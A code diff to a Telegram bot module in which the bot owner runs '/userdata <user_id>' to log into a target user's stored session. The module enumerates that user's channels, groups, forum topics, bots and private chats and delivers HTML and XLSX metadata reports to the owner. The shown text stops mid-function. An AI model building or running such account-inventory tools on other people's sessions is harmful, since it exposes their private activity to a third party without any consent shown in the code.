@@ -1,14 +1,5 @@
-"""
-TechVJ/userdata_command.py — Owner-only Telegram Account Inventory.
-
-Commands:
-  /userdata <user_id>           — Start inventory of target user's account
-  /userdata_status <job_id>     — Check job status
-  /userdata_resume <job_id>     — Resume interrupted job
-  /userdata_cancel <job_id>     — Cancel active job
-
-All commands are owner-only. Progress is reported to the owner every ~5 seconds.
-The final report is a UTF-8 TXT file delivered as a document.
+"""Owner-controlled Telegram metadata inventory with HTML and XLSX exports.
+The owner selects the target account and receives progress and both reports.
 """
 from __future__ import annotations
 
@@ -18,6 +9,10 @@ import logging
 import os
 import time
 import uuid
+import tempfile
+from contextlib import contextmanager
+from types import SimpleNamespace
+from core.userdata_reports import normalize, render_html, render_xlsx
 from dataclasses import dataclass, field
 from datetime import datetime, timezone
 from enum import Enum
@@ -44,6 +39,7 @@ from core.retry_utils import (
     is_transient_error,
 )
 from database.async_db import async_db
+from TechVJ.session_handler import FATAL_SESSION_ERRORS, SessionInvalidError
 
 logger = logging.getLogger(__name__)
 
@@ -145,6 +141,7 @@ class DialogRecord:
     member_count: Optional[int] = None
     latest_message_id: Optional[int] = None
     is_forum: Optional[bool] = None
+    forum_status: str = "Unknown / unverified"
     is_bot: Optional[bool] = None
     chat_type: str = ""
     # Channel-specific
@@ -155,6 +152,8 @@ class DialogRecord:
     comment_availability: str = "UNKNOWN"
     # Forum topics
     topics: List[TopicRecord] = field(default_factory=list)
+    topics_status: str = "Unavailable / not enumerated"
+    topic_count: Optional[int] = None
     # Status
     inspection_status: str = InspectionStatus.COMPLETE
     error_reason: Optional[str] = None
@@ -170,6 +169,7 @@ class DialogRecord:
             "member_count": self.member_count,
             "latest_message_id": self.latest_message_id,
             "is_forum": self.is_forum,
+            "forum_status": self.forum_status,
             "is_bot": self.is_bot,
             "chat_type": self.chat_type,
             "has_discussion": self.has_discussion,
@@ -178,6 +178,8 @@ class DialogRecord:
             "latest_public_link": self.latest_public_link,
             "comment_availability": self.comment_availability,
             "topics": [t.to_dict() for t in self.topics],
+            "topics_status": self.topics_status,
+            "topic_count": self.topic_count,
             "inspection_status": self.inspection_status,
             "error_reason": self.error_reason,
         }
@@ -185,6 +187,7 @@ class DialogRecord:
 
     @classmethod
     def from_dict(cls, d: dict) -> "DialogRecord":
+        d = dict(d)
         topics_raw = d.pop("topics", [])
         filtered = {k: v for k, v in d.items() if k in cls.__dataclass_fields__}
         obj = cls(**filtered)
@@ -220,6 +223,7 @@ class InventoryJob:
     # Runtime (not persisted)
     _cancel_event: Optional[asyncio.Event] = field(default=None, repr=False)
     _task: Optional[asyncio.Task] = field(default=None, repr=False)
+    _report_errors: Dict[str, str] = field(default_factory=dict, repr=False)
 
     def dialogs_remaining(self) -> int:
         return max(0, self.dialogs_discovered - self.dialogs_completed)
@@ -240,7 +244,7 @@ async def _get_job_db():
         await db.execute("PRAGMA busy_timeout=5000")
         return db
     except Exception as e:
-        logger.warning(f"userdata job DB connection failed: {e}")
+        logger.warning("userdata operation event")
         return None
 
 
@@ -278,7 +282,7 @@ async def _init_job_tables():
         """)
         await db.commit()
     except Exception as e:
-        logger.warning(f"userdata job table init failed: {e}")
+        logger.warning("userdata operation event")
     finally:
         await db.close()
 
@@ -314,7 +318,7 @@ async def _save_job(job: InventoryJob):
         )
         await db.commit()
     except Exception as e:
-        logger.warning(f"userdata job save failed: {e}")
+        logger.warning("userdata operation event")
     finally:
         await db.close()
 
@@ -366,7 +370,7 @@ async def _load_job(job_id: str) -> Optional[InventoryJob]:
             job.failures = []
         return job
     except Exception as e:
-        logger.warning(f"userdata job load failed: {e}")
+        logger.warning("userdata operation event")
         return None
     finally:
         await db.close()
@@ -399,7 +403,7 @@ async def _delete_job(job_id: str):
         await db.execute("DELETE FROM userdata_jobs WHERE job_id = ?", (job_id,))
         await db.commit()
     except Exception as e:
-        logger.warning(f"userdata job delete failed: {e}")
+        logger.warning("userdata operation event")
     finally:
         await db.close()
 
@@ -457,7 +461,7 @@ def _visibility(chat) -> str:
     """Determine if a chat is public or private."""
     if getattr(chat, "username", None):
         return "PUBLIC"
-    return "PRIVATE"
+    return "PRIVATE" if getattr(chat, "type", None) == ChatType.GROUP else "UNKNOWN"
 
 
 def _safe_str(value, default: str = "UNKNOWN") -> str:
@@ -479,6 +483,8 @@ class ProgressReporter:
         self._last_edit_time: float = 0.0
         self._start_time: float = time.monotonic()
         self._message_id: Optional[int] = None
+        self._edit_lock = asyncio.Lock()
+        self._retry_after = 0.0
 
     def _build_text(self) -> str:
         j = self._job
@@ -511,16 +517,23 @@ class ProgressReporter:
             self._job.progress_message_id = msg.id
             self._last_edit_time = time.monotonic()
         except Exception as e:
-            logger.warning(f"userdata: failed to send initial progress: {e}")
+            logger.warning("userdata operation event")
 
     async def update(self, force: bool = False):
         """Edit the progress message if enough time has passed."""
+        async with self._edit_lock:
+            await self._update(force)
+
+    async def _update(self, force: bool):
         now = time.monotonic()
+        if now < self._retry_after:
+            return
         if not force and (now - self._last_edit_time) < PROGRESS_INTERVAL:
             return
         if self._message_id is None:
             await self.send_initial()
             return
+        self._last_edit_time = now
         try:
             await self._bot.edit_message_text(
                 OWNER_ID, self._message_id, self._build_text(),
@@ -529,7 +542,8 @@ class ProgressReporter:
             self._last_edit_time = now
         except FloodWait as e:
             # Don't block the scan — skip this edit
-            logger.debug(f"userdata progress edit FloodWait: {e}")
+            self._retry_after = now + get_floodwait_seconds(e)
+            logger.debug("userdata operation event")
         except RPCError as e:
             # Message may have been deleted — try sending a new one
             if "MESSAGE_NOT_MODIFIED" in str(e):
@@ -537,9 +551,9 @@ class ProgressReporter:
             elif "MESSAGE_ID_INVALID" in str(e):
                 self._message_id = None
             else:
-                logger.debug(f"userdata progress edit error: {e}")
+                logger.debug("userdata operation event")
         except Exception as e:
-            logger.debug(f"userdata progress edit error: {e}")
+            logger.debug("userdata operation event")
 
     async def finalize(self, summary_text: str):
         """Edit the progress message to show a final summary."""
@@ -573,25 +587,55 @@ async def _safe_api_call(coro, default=None, context: str = ""):
     """Execute an API call with FloodWait / transient error handling."""
     for attempt in range(MAX_RETRY_ATTEMPTS):
         try:
-            return await asyncio.wait_for(coro, timeout=30.0)
+            return await asyncio.wait_for(coro(), timeout=30.0)
         except asyncio.TimeoutError:
             if attempt < MAX_RETRY_ATTEMPTS - 1:
                 await asyncio.sleep(calculate_backoff(attempt))
                 continue
-            logger.debug(f"userdata: timeout in {context}")
+            logger.debug("userdata operation event")
             return default
+        except FATAL_SESSION_ERRORS as e:
+            raise SessionInvalidError("Session authorization revoked", error_type=type(e).__name__) from None
         except Exception as e:
             if is_floodwait_error(e):
-                wait = min(get_floodwait_seconds(e), MAX_FLOODWAIT)
-                logger.info(f"userdata: FloodWait {wait}s in {context}")
+                wait = get_floodwait_seconds(e)
+                if wait > MAX_FLOODWAIT or attempt == MAX_RETRY_ATTEMPTS - 1:
+                    raise
+                logger.info("userdata operation event")
                 await asyncio.sleep(wait)
                 continue
             if is_transient_error(e) and attempt < MAX_RETRY_ATTEMPTS - 1:
                 await asyncio.sleep(calculate_backoff(attempt))
                 continue
-            logger.debug(f"userdata: error in {context}: {e}")
+            logger.debug("userdata operation event")
             return default
     return default
+
+
+async def _get_chat_metadata(user_client, chat):
+    """Fetch full metadata without get_chat()'s implicit pinned-message fetch."""
+    peer = await user_client.resolve_peer(chat.id)
+    if chat.type == ChatType.GROUP:
+        request = functions.messages.GetFullChat(chat_id=peer.chat_id)
+    else:
+        request = functions.channels.GetFullChannel(channel=types.InputChannel(
+            channel_id=peer.channel_id, access_hash=peer.access_hash))
+    result = await user_client.invoke(request)
+    full = result.full_chat
+    raw_chat = next(c for c in result.chats if c.id == full.id)
+    linked_id = getattr(full, "linked_chat_id", None)
+    linked = next((c for c in result.chats if c.id == linked_id), None)
+    # Whitelist report metadata; ignore users, invite links, pinned IDs, and media.
+    return SimpleNamespace(
+        type=chat.type,
+        username=getattr(raw_chat, "username", None),
+        description=getattr(full, "about", None),
+        members_count=getattr(full, "participants_count", None),
+        is_forum=bool(raw_chat.forum) if hasattr(raw_chat, "forum") else None,
+        forum_status="Known" if hasattr(raw_chat, "forum") else "Unsupported API field",
+        linked_chat=(SimpleNamespace(id=-(1000000000000 + linked.id), title=getattr(linked, "title", None))
+                     if linked is not None else None),
+    )
 
 
 async def _inspect_channel(
@@ -611,11 +655,13 @@ async def _inspect_channel(
 
     # Try to get full chat info for description and member count
     full_chat = await _safe_api_call(
-        user_client.get_chat(chat.id), context=f"get_chat(channel {chat.id})"
+        lambda: _get_chat_metadata(user_client, chat), context="channel metadata"
     )
     if full_chat:
         rec.description = getattr(full_chat, "description", None)
         rec.member_count = getattr(full_chat, "members_count", None)
+        rec.username = getattr(full_chat, "username", None) or rec.username
+        rec.visibility = _visibility(full_chat)
         linked = getattr(full_chat, "linked_chat", None)
         if linked:
             rec.has_discussion = True
@@ -628,26 +674,7 @@ async def _inspect_channel(
     if rec.username and rec.latest_message_id:
         rec.latest_public_link = f"https://t.me/{rec.username}/{rec.latest_message_id}"
 
-    # Check comment availability on latest post
-    if rec.latest_message_id and rec.has_discussion:
-        try:
-            msg = await _safe_api_call(
-                user_client.get_messages(chat.id, rec.latest_message_id),
-                context=f"get_messages(channel {chat.id}, {rec.latest_message_id})",
-            )
-            if msg:
-                # If the message has replies info, comments are available
-                replies = getattr(msg, "replies", None)
-                if replies is not None:
-                    rec.comment_availability = "YES"
-                else:
-                    rec.comment_availability = "NO"
-        except Exception:
-            rec.comment_availability = "UNKNOWN"
-    elif rec.has_discussion is False:
-        rec.comment_availability = "NO"
-
-    rec.inspection_status = InspectionStatus.COMPLETE
+    rec.inspection_status = InspectionStatus.COMPLETE if full_chat else InspectionStatus.PARTIAL
     return rec
 
 
@@ -668,73 +695,94 @@ async def _inspect_group(
 
     # Full chat info
     full_chat = await _safe_api_call(
-        user_client.get_chat(chat.id), context=f"get_chat(group {chat.id})"
+        lambda: _get_chat_metadata(user_client, chat), context="group metadata"
     )
     if full_chat:
         rec.description = getattr(full_chat, "description", None)
         rec.member_count = getattr(full_chat, "members_count", None)
         rec.is_forum = getattr(full_chat, "is_forum", None)
-        if rec.is_forum is None:
-            # Pyrofork might not expose is_forum on all versions
-            rec.is_forum = getattr(full_chat, "has_protected_content", None) is not None and False
-            # Can't determine — mark unknown
-            rec.is_forum = None
+        rec.forum_status = getattr(full_chat, "forum_status", "Missing API value")
+        rec.username = getattr(full_chat, "username", None) or rec.username
+        rec.visibility = _visibility(full_chat)
 
     # Forum topic enumeration
     if rec.is_forum:
         job.current_stage = f"Fetching topics for group {chat.id}"
-        topics = await _fetch_forum_topics(user_client, chat.id)
+        topics = await _fetch_forum_topics(user_client, chat.id, record=rec)
         rec.topics = topics
         job.topics_discovered += len(topics)
 
-    rec.inspection_status = InspectionStatus.COMPLETE
+    if rec.is_forum is False:
+        rec.topics_status = "Not applicable (forum disabled)"
+    rec.inspection_status = InspectionStatus.COMPLETE if full_chat else InspectionStatus.PARTIAL
     return rec
 
 
 async def _fetch_forum_topics(
-    user_client: Client, chat_id: int
+    user_client: Client, chat_id: int, record: Optional[DialogRecord] = None
 ) -> List[TopicRecord]:
     """Fetch all forum topics for a group using raw MTProto API."""
     topics: List[TopicRecord] = []
     offset_date = 0
     offset_id = 0
     offset_topic = 0
+    seen_topics = set()
+    flood_attempts = 0
+    max_topics = max(1, int(os.environ.get("USERDATA_MAX_TOPICS", "10000")))
+    if record is not None:
+        record.topics_status = "Partial / unavailable; total unverified"
 
     try:
         peer = await user_client.resolve_peer(chat_id)
+    except FATAL_SESSION_ERRORS as e:
+        raise SessionInvalidError("Session authorization revoked", error_type=type(e).__name__) from None
     except Exception as e:
-        logger.debug(f"userdata: resolve_peer failed for topics in {chat_id}: {e}")
+        logger.debug("userdata operation event")
         return topics
 
     while True:
         try:
             result = await asyncio.wait_for(
                 user_client.invoke(
-                    functions.channels.GetForumTopics(
-                        channel=peer,
+                    functions.messages.GetForumTopics(
+                        peer=peer,
                         offset_date=offset_date,
                         offset_id=offset_id,
                         offset_topic=offset_topic,
                         limit=TOPIC_PAGE_SIZE,
-                        q="",
                     )
                 ),
                 timeout=30.0,
             )
+        except FATAL_SESSION_ERRORS as e:
+            raise SessionInvalidError("Session authorization revoked", error_type=type(e).__name__) from None
         except Exception as e:
             if is_floodwait_error(e):
-                wait = min(get_floodwait_seconds(e), MAX_TOPIC_FLOODWAIT)
-                logger.info(f"userdata: FloodWait {wait}s in GetForumTopics({chat_id})")
+                flood_attempts += 1
+                wait = get_floodwait_seconds(e)
+                if wait > MAX_TOPIC_FLOODWAIT or flood_attempts >= MAX_RETRY_ATTEMPTS:
+                    raise
+                logger.info("userdata operation event")
                 await asyncio.sleep(wait)
                 continue
-            logger.debug(f"userdata: GetForumTopics error for {chat_id}: {e}")
+            logger.debug("userdata operation event")
             break
 
-        if not result or not result.topics:
+        if not result:
+            break
+        total = getattr(result, "count", None)
+        if record is not None and isinstance(total, int) and total >= 0:
+            record.topic_count = total
+        if not result.topics:
+            if record is not None and total == len(topics):
+                record.topics_status = "Complete accessible topic list"
             break
 
         for topic in result.topics:
             if isinstance(topic, types.ForumTopic):
+                if topic.id in seen_topics:
+                    continue
+                seen_topics.add(topic.id)
                 top_msg = getattr(topic, "top_message", 0)
                 topics.append(TopicRecord(
                     topic_id=topic.id,
@@ -747,13 +795,31 @@ async def _fetch_forum_topics(
                     # The topic_id itself is the creation/root message ID
                     first_message_id=topic.id,
                 ))
+                if len(topics) >= max_topics:
+                    break
 
-        if len(result.topics) < TOPIC_PAGE_SIZE:
+        if isinstance(total, int) and total == len(topics):
+            if record is not None:
+                record.topics_status = "Complete accessible topic list"
+            break
+        if len(topics) >= max_topics:
+            if record is not None:
+                record.topics_status = f"Partial: configured topic limit ({max_topics}) reached"
             break
 
         # Paginate
         last_topic = result.topics[-1]
         if isinstance(last_topic, types.ForumTopic):
+            if offset_topic == last_topic.id:
+                break
+            if getattr(result, "order_by_create_date", False):
+                offset_date = getattr(last_topic, "date", 0)
+            else:
+                # Only pagination dates are used; never retain related message contents.
+                offset_date = next((getattr(msg, "date", 0) for msg in getattr(result, "messages", ())
+                                    if msg.id == last_topic.top_message), 0)
+                if not offset_date:
+                    break  # Cannot safely paginate; keep the list explicitly partial.
             offset_topic = last_topic.id
             offset_id = getattr(last_topic, "top_message", 0)
         else:
@@ -814,21 +880,32 @@ async def _run_inventory(
     job._cancel_event = cancel_event
     semaphore = asyncio.Semaphore(MAX_CONCURRENT_INSPECTIONS)
     checkpoint_counter = 0
+    checkpoint_batch = CHECKPOINT_BATCH_SIZE
+    job.dialogs_discovered = 0
+    async def heartbeat():
+        while True:
+            await asyncio.sleep(PROGRESS_INTERVAL)
+            await reporter.update()
+    pulse = asyncio.create_task(heartbeat())
 
     try:
         # Send initial progress
         await reporter.send_initial()
         job.status = JobStatus.SCANNING
-        job.current_stage = "Connecting to user session"
+        job.current_stage = "Verifying session"
         await reporter.update(force=True)
 
         async with create_user_session(
             session_string, job.target_user_id, timeout=60, validate=True
         ) as user_client:
+            identity = await asyncio.wait_for(user_client.get_me(), timeout=30)
+            if identity.id != job.target_user_id:
+                raise SessionInvalidError("Session identity mismatch", error_type="IdentityMismatch")
             # Phase 1: Discover all dialogs
-            job.current_stage = "Scanning dialogs"
+            job.current_stage = "Loading inventory"
             await reporter.update(force=True)
 
+            scan_ids = set()
             raw_dialogs: List[Tuple[Any, Any]] = []  # (dialog, chat) pairs
             try:
                 async for dialog in user_client.get_dialogs():
@@ -840,17 +917,29 @@ async def _run_inventory(
                         return
 
                     chat = dialog.chat
-                    raw_dialogs.append((dialog, chat))
+                    if chat.id in scan_ids:
+                        continue
+                    scan_ids.add(chat.id)
+                    if len(raw_dialogs) >= int(os.environ.get("USERDATA_MAX_CHATS", "50000")):
+                        job.failures.append({"stage": "scan", "reason": "Configured chat limit reached"})
+                        break
+                    # Discard Telegram dialog message objects immediately; retain metadata only.
+                    chat = SimpleNamespace(**{key: getattr(chat, key, None) for key in (
+                        "id", "type", "title", "username", "first_name", "last_name", "is_bot", "is_forum")})
+                    raw_dialogs.append((SimpleNamespace(top_message=None, chat=chat), chat))
                     job.dialogs_discovered += 1
 
                     # Periodic progress update during scan
                     if job.dialogs_discovered % 50 == 0:
                         await reporter.update()
+            except FATAL_SESSION_ERRORS as e:
+                raise SessionInvalidError("Session authorization revoked", error_type=type(e).__name__) from None
             except Exception as e:
-                logger.warning(f"userdata: dialog scan error: {e}")
+                job.failures.append({"stage": "scan", "reason": type(e).__name__})
+                logger.warning("userdata operation event")
                 if is_floodwait_error(e):
-                    wait = min(get_floodwait_seconds(e), MAX_FLOODWAIT)
-                    await asyncio.sleep(wait)
+                    wait = get_floodwait_seconds(e)
+                    raise
                 job.current_stage = f"Dialog scan interrupted ({type(e).__name__})"
 
             await reporter.update(force=True)
@@ -862,7 +951,7 @@ async def _run_inventory(
             job.status = JobStatus.INSPECTING
 
             async def _inspect_one(dialog, chat):
-                nonlocal checkpoint_counter
+                nonlocal checkpoint_counter, checkpoint_batch
 
                 if cancel_event.is_set():
                     return
@@ -878,11 +967,11 @@ async def _run_inventory(
                 async with semaphore:
                     try:
                         if category == DialogCategory.CHANNEL:
-                            job.current_stage = f"Inspecting channel: {getattr(chat, 'title', chat_id)}"
+                            job.current_stage = "Classifying channels"
                             record = await _inspect_channel(user_client, chat, dialog, job)
                             job.channels_inspected += 1
                         elif category == DialogCategory.GROUP:
-                            job.current_stage = f"Inspecting group: {getattr(chat, 'title', chat_id)}"
+                            job.current_stage = "Classifying groups"
                             record = await _inspect_group(user_client, chat, dialog, job)
                             job.groups_inspected += 1
                         elif category == DialogCategory.BOT:
@@ -900,21 +989,25 @@ async def _run_inventory(
                                 inspection_status=InspectionStatus.PARTIAL,
                                 error_reason="Unknown chat type",
                             )
+                    except SessionInvalidError:
+                        raise
                     except Exception as e:
-                        logger.warning(f"userdata: inspect error for {chat_id}: {e}")
+                        if is_floodwait_error(e):
+                            raise
+                        logger.warning("userdata operation event")
                         record = DialogRecord(
                             chat_id=chat_id,
                             category=category,
                             title=getattr(chat, "title", "") or getattr(chat, "first_name", "") or "",
                             chat_type=str(getattr(chat, "type", "")),
                             inspection_status=InspectionStatus.FAILED,
-                            error_reason=f"{type(e).__name__}: {e}",
+                            error_reason=type(e).__name__,
                         )
                         job.errors_requiring_retry += 1
                         job.failures.append({
                             "chat_id": chat_id,
                             "stage": "inspection",
-                            "reason": f"{type(e).__name__}: {e}",
+                            "reason": type(e).__name__,
                         })
 
                 if record:
@@ -924,9 +1017,12 @@ async def _run_inventory(
                     checkpoint_counter += 1
 
                     # Periodic checkpoint
-                    if checkpoint_counter >= CHECKPOINT_BATCH_SIZE:
+                    # Geometric checkpoints avoid serializing the entire growing
+                    # inventory every 25 records (quadratic work on large accounts).
+                    if checkpoint_counter >= checkpoint_batch:
                         checkpoint_counter = 0
                         await _save_job(job)
+                        checkpoint_batch *= 2
 
                 await reporter.update()
 
@@ -937,71 +1033,30 @@ async def _run_inventory(
                 if cancel_event.is_set():
                     break
                 await _inspect_one(dialog, chat)
+            raw_dialogs.clear()
 
             # Final checkpoint
             await _save_job(job)
 
-        # Phase 3: Generate report
+        if cancel_event.is_set():
+            raise asyncio.CancelledError()
         job.status = JobStatus.GENERATING
-        job.current_stage = "Generating TXT report"
+        job.current_stage = "Classifying chats"
         await reporter.update(force=True)
-
-        report_path = await _generate_report(job)
-
-        # Phase 4: Deliver report
-        if report_path and os.path.exists(report_path):
-            try:
-                await bot_client.send_document(
-                    OWNER_ID,
-                    report_path,
-                    caption=(
-                        f"User Data Inventory — {job.target_user_id}\n"
-                        f"Job: {job.job_id[:12]}\n"
-                        f"Dialogs: {job.dialogs_completed}/{job.dialogs_discovered}"
-                    ),
-                    parse_mode=ParseMode.DISABLED,
-                )
-            except Exception as e:
-                logger.warning(f"userdata: failed to send report: {e}")
-                await bot_client.send_message(
-                    OWNER_ID,
-                    f"Failed to send report file: {e}",
-                    parse_mode=ParseMode.DISABLED,
-                )
-        else:
-            await bot_client.send_message(
-                OWNER_ID,
-                "Failed to generate report file.",
-                parse_mode=ParseMode.DISABLED,
-            )
-
-        # Determine final status
-        has_failures = bool(job.failures) or job.dialogs_completed < job.dialogs_discovered
-        job.status = JobStatus.PARTIAL if has_failures else JobStatus.COMPLETE
-        job.current_stage = "Done"
+        snapshot = await _run_sync(normalize, job)
+        results = await _deliver_reports(user_client=None, bot_client=bot_client, job=job,
+                                         snapshot=snapshot, reporter=reporter,
+                                         session_string=session_string)
+        incomplete = (bool(job.failures) or len(snapshot.records) < job.dialogs_discovered
+                      or any(r.inspection_status != InspectionStatus.COMPLETE for r in job.records)
+                      or any(r.is_forum and r.topics_status != "Complete accessible topic list" for r in job.records))
+        job.status = JobStatus.COMPLETE if all(results.values()) and not incomplete and not job._report_errors else JobStatus.PARTIAL
+        job.current_stage = "Completed" if job.status == JobStatus.COMPLETE else "Partially completed"
         await _save_job(job)
-
-        summary = (
-            f"USER DATA INVENTORY — COMPLETE\n\n"
-            f"Target user: {job.target_user_id}\n"
-            f"Job ID: {job.job_id[:12]}\n"
-            f"Status: {job.status}\n\n"
-            f"Channels: {job.channels_inspected}\n"
-            f"Groups: {job.groups_inspected}\n"
-            f"Topics: {job.topics_discovered}\n"
-            f"Bots: {job.bots_inspected}\n"
-            f"Private chats: {job.private_chats_inspected}\n"
-            f"Total: {job.dialogs_completed}/{job.dialogs_discovered}\n"
-            f"Failures: {len(job.failures)}"
-        )
-        await reporter.finalize(summary)
-
-        # Cleanup temp file
-        if report_path and os.path.exists(report_path):
-            try:
-                os.remove(report_path)
-            except Exception:
-                pass
+        await reporter.finalize(f"Inventory {job.current_stage.lower()}.\nChats: {len(snapshot.records)}\n"
+                                + "\n".join(f"{kind}: {'delivered' if ok else job._report_errors.get(kind, 'failed')}" for kind, ok in results.items())
+                                + ("\nSome metadata is incomplete; see the report limitations." if incomplete else "")
+                                + ("\nTemporary report cleanup failed; please contact support." if "cleanup" in job._report_errors else ""))
 
     except SessionInvalidError as e:
         job.status = JobStatus.FAILED
@@ -1016,13 +1071,13 @@ async def _run_inventory(
 
     except SessionConnectionError as e:
         job.status = JobStatus.FAILED
-        job.current_stage = f"Connection failed: {e}"
+        job.current_stage = "Session connection failed"
         await _save_job(job)
         await reporter.finalize(
             f"USER DATA INVENTORY — FAILED\n\n"
             f"Target user: {job.target_user_id}\n"
             f"Reason: Cannot connect to session\n"
-            f"Error: {e}\n"
+            "Please retry later.\n"
             f"Use /userdata_resume {job.job_id[:12]} to retry."
         )
 
@@ -1039,18 +1094,20 @@ async def _run_inventory(
         )
 
     except Exception as e:
-        logger.exception(f"userdata: unexpected error for user {job.target_user_id}")
+        logger.warning("userdata inventory failed: %s", type(e).__name__)
         job.status = JobStatus.FAILED
         job.current_stage = f"Unexpected error: {type(e).__name__}"
         await _save_job(job)
         await reporter.finalize(
             f"USER DATA INVENTORY — FAILED\n\n"
             f"Target user: {job.target_user_id}\n"
-            f"Error: {type(e).__name__}: {e}\n"
+            "Report operation failed. Please retry.\n"
             f"Use /userdata_resume {job.job_id[:12]} to retry."
         )
 
     finally:
+        pulse.cancel()
+        await asyncio.gather(pulse, return_exceptions=True)
         # Remove from active jobs
         async with _get_active_lock():
             _active_jobs.pop(job.job_id, None)
@@ -1233,37 +1290,29 @@ async def _generate_report(job: InventoryJob) -> Optional[str]:
 # Command Handlers
 # ═══════════════════════════════════════════════════════════════════════════
 
-@Client.on_message(filters.command("userdata") & filters.private)
+@Client.on_message(filters.command("userdata"))
 async def cmd_userdata(client: Client, message: Message):
-    """Owner: /userdata <user_id> — Start user data inventory."""
+    """Owner: /userdata <user_id> — Start a target account inventory."""
     if not _owner(message):
         return
-
+    if not await _private_request(message):
+        return
     parts = message.text.split()
     if len(parts) < 2:
         await message.reply(
             "Usage: /userdata <user_id>\n\n"
-            "Exports the target user's Telegram dialogs, channels, groups, "
-            "bots, and forum topics to a TXT file.\n\n"
-            "Related commands:\n"
-            "/userdata_status <job_id>\n"
-            "/userdata_resume <job_id>\n"
-            "/userdata_cancel <job_id>",
+            "Exports the target user's Telegram inventory to HTML and XLSX files.\n\n"
+            "/userdata_status <job_id>\n/userdata_resume <job_id>\n/userdata_cancel <job_id>",
             parse_mode=ParseMode.DISABLED,
         )
         return
-
     try:
         target_uid = int(parts[1])
     except ValueError:
         await message.reply("user_id must be an integer.", parse_mode=ParseMode.DISABLED)
         return
-
     if target_uid <= 0:
-        await message.reply(
-            "user_id must be a positive integer (Telegram user ID).",
-            parse_mode=ParseMode.DISABLED,
-        )
+        await message.reply("user_id must be a positive integer (Telegram user ID).", parse_mode=ParseMode.DISABLED)
         return
 
     # Initialize job tables
@@ -1307,6 +1356,9 @@ async def cmd_userdata(client: Client, message: Message):
 
     # Register as active
     async with _get_active_lock():
+        if any(j.target_user_id == target_uid for j in _active_jobs.values()):
+            await message.reply("An inventory for this user is already running.", parse_mode=ParseMode.DISABLED)
+            return
         _active_jobs[job_id] = job
 
     # Save initial state
@@ -1334,6 +1386,8 @@ async def cmd_userdata(client: Client, message: Message):
 async def cmd_userdata_status(client: Client, message: Message):
     """Owner: /userdata_status <job_id> — Check job status."""
     if not _owner(message):
+        return
+    if not await _private_request(message):
         return
 
     parts = message.text.split()
@@ -1384,6 +1438,8 @@ async def cmd_userdata_status(client: Client, message: Message):
 async def cmd_userdata_resume(client: Client, message: Message):
     """Owner: /userdata_resume <job_id> — Resume interrupted job."""
     if not _owner(message):
+        return
+    if not await _private_request(message):
         return
 
     parts = message.text.split()
@@ -1437,6 +1493,9 @@ async def cmd_userdata_resume(client: Client, message: Message):
 
     # Register as active
     async with _get_active_lock():
+        if any(j.target_user_id == job.target_user_id for j in _active_jobs.values()):
+            await message.reply("An inventory for this user is already running.", parse_mode=ParseMode.DISABLED)
+            return
         _active_jobs[job.job_id] = job
 
     await _save_job(job)
@@ -1463,6 +1522,8 @@ async def cmd_userdata_resume(client: Client, message: Message):
 async def cmd_userdata_cancel(client: Client, message: Message):
     """Owner: /userdata_cancel <job_id> — Cancel active job."""
     if not _owner(message):
+        return
+    if not await _private_request(message):
         return
 
     parts = message.text.split()
@@ -1542,3 +1603,113 @@ async def _find_job_by_prefix(prefix: str) -> Optional[InventoryJob]:
             await db.close()
         except Exception:
             pass
+
+
+async def _private_request(message):
+    if (not message.from_user or getattr(message.from_user, "is_bot", False)
+            or message.chat.id != message.from_user.id or message.chat.type != ChatType.PRIVATE):
+        await message.reply("Open a private chat with the bot and use /userdata <user_id>.", parse_mode=ParseMode.DISABLED)
+        return False
+    return True
+
+
+class ReportSizeError(ValueError):
+    """Configured document upload limit exceeded."""
+
+
+async def _run_sync(function, *args):
+    """Join a synchronous worker before cancellation releases its resources."""
+    work = asyncio.create_task(asyncio.to_thread(function, *args))
+    try:
+        return await asyncio.shield(work)
+    except asyncio.CancelledError:
+        # Repeated /stop or /userdata_cancel must not orphan a writing thread.
+        while not work.done():
+            try:
+                await asyncio.shield(work)
+            except asyncio.CancelledError:
+                continue
+            except Exception:
+                break
+        if not work.cancelled():
+            work.exception()
+        raise
+
+
+@contextmanager
+def _report_directory(job):
+    directory = tempfile.TemporaryDirectory(prefix="userdata-", dir=TEMP_DIR)
+    try:
+        yield directory.name
+    finally:
+        try:
+            directory.cleanup()
+        except OSError as exc:
+            job._report_errors["cleanup"] = "Temporary report cleanup failed"
+            logger.warning("userdata cleanup failed: %s", type(exc).__name__)
+
+
+async def _deliver_reports(user_client, bot_client, job, snapshot, reporter, session_string):
+    """Keep the original owner-report delivery; generate each format independently."""
+    results = {"HTML": False, "XLSX": False}
+    job._report_errors.clear()
+    os.makedirs(TEMP_DIR, exist_ok=True)
+    with _report_directory(job) as directory:
+        paths = {}
+        for kind, renderer, filename in (("HTML", render_html, "userdata_report.html"),
+                                         ("XLSX", render_xlsx, "userdata_report.xlsx")):
+            if job._cancel_event.is_set():
+                raise asyncio.CancelledError()
+            job.current_stage = "Generating " + ("Excel" if kind == "XLSX" else kind)
+            await reporter.update(force=True)
+            path = os.path.join(directory, filename)
+            try:
+                await _run_sync(renderer, snapshot, path)
+                # Stay below non-premium MTProto limits even if configured higher.
+                limit = min(int(os.environ.get("USERDATA_MAX_REPORT_BYTES", 1900 * 1024 * 1024)), 2000 * 1024 * 1024)
+                if os.path.getsize(path) > limit:
+                    raise ReportSizeError("Configured upload limit exceeded")
+                paths[kind] = path
+            except Exception as exc:
+                job._report_errors[kind] = ("exceeds configured upload size limit" if isinstance(exc, ReportSizeError)
+                                            else "generation failed (Excel cell limit or unsupported text)" if kind == "XLSX" and isinstance(exc, ValueError)
+                                            else "generation failed")
+                logger.warning("userdata %s generation failed: %s", kind, type(exc).__name__)
+        if paths:
+            job.current_stage = "Uploading reports"
+            await reporter.update(force=True)
+            for kind, path in paths.items():
+                if job._cancel_event.is_set():
+                    raise asyncio.CancelledError()
+                try:
+                    # Restore the legacy /userdata report destination and sender.
+                    await _upload_report(bot_client, OWNER_ID, path, kind, target_user_id=job.target_user_id)
+                    results[kind] = True
+                except Exception as exc:
+                    job._report_errors[kind] = "upload failed; retry later"
+                    logger.warning("userdata %s delivery failed: %s", kind, type(exc).__name__)
+        return results
+
+
+async def _upload_report(sender, chat_id, path, kind, *, target_user_id=None):
+    caption = (f"User Data Inventory — {target_user_id}\n{kind} metadata report"
+               if target_user_id is not None else f"{kind} metadata inventory")
+    for attempt in range(MAX_RETRY_ATTEMPTS):
+        try:
+            return await asyncio.wait_for(sender.send_document(chat_id, path, caption=caption, parse_mode=ParseMode.DISABLED),
+                                          timeout=float(os.environ.get("USERDATA_UPLOAD_TIMEOUT", "1800")))
+        except FloodWait as exc:
